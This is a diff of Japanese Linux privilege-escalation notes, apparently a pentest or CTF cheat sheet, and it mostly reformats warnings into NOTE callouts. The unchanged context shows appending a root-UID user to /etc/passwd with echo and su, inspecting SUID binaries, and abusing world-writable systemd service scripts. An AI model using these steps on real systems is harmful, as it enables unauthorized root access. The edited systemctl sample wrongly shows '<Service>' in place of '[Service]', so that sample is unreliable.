@@ -93,8 +93,6 @@ chmod +x <(同じ名前)file.sh>
 ```zsh
 openssl passwd <pw>
 ```
-- ⚠️：`openssl`は通常はデフォルトでLinuxがサポートするハッシュアルゴリズムでハッシュ化するが、システムによってはサポートされないハッシュアルゴリズムを使うことがある
-	- →[💥Linux Privilege Escalation](#補足：opensslがサポートされないハッシュアルゴリズムを使ってしまうとき)
 
 2. `/etc/passwd`に任意のユーザーと作成したパスワードハッシュの組み合わせを追記する
 ```zsh
@@ -105,6 +103,9 @@ echo '<username>:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
 ```zsh
 su <username>
 ```
+
+> [!NOTE]
+> `openssl` は通常デフォルトでLinuxがサポートするハッシュアルゴリズムでハッシュ化するが、システムによってはサポートされないアルゴリズムを使うことがある。その場合は[補足：opensslがサポートされないハッシュアルゴリズムを使ってしまうとき](#補足：opensslがサポートされないハッシュアルゴリズムを使ってしまうとき)を参照
 
 ## 補足：opensslがサポートされないハッシュアルゴリズムを使ってしまうとき
 
@@ -127,8 +128,10 @@ openssl passwd -6 <pw>
 ```
 
 3. 出力されたパスワードハッシュで`/etc/passwd`に書き込む
-	- ⚠️出力されたハッシュをすべてコピーすること
-	- ⚠️`$`が付く場合、ダブルクオテーションで囲まないこと（展開されて異なる意味になる）
+
+> [!NOTE]
+> - 出力されたハッシュを**すべてコピー**すること
+> - `$` が含まれる場合、ダブルクォーテーションで囲まないこと（シェル変数として展開され、ハッシュが壊れる）
 
 ---
 ---
@@ -288,7 +291,7 @@ Shellshockと呼ばれる。
 
 2. 対象のSUIDバイナリの中身を閲覧し、実行コマンドのパスを確認
 ```zsh
-strings [SUIDバイナリのパス]
+strings <SUIDバイナリのパス>
 ```
 ↓出力例
 ```
@@ -795,8 +798,8 @@ systemctl cat <service>
 ```
 	↓出力例
 ```zsh
-[Service]
-ExecStart=/usr/local/bin/[xxx.sh]
+<Service>
+ExecStart=/usr/local/bin/<xxx.sh>
 ```
 
 2. 実行ファイルのパーミッションを確認
@@ -805,7 +808,7 @@ ls -la <path_to_binary>
 ```
 	↓
 ```zsh
--rwxrwxrwx 1 root root 1234 Aug 30 10:00 /usr/local/bin/[xxx.sh]
+-rwxrwxrwx 1 root root 1234 Aug 30 10:00 /usr/local/bin/<xxx.sh>
 ```
 →誰でも書き換え可能
 
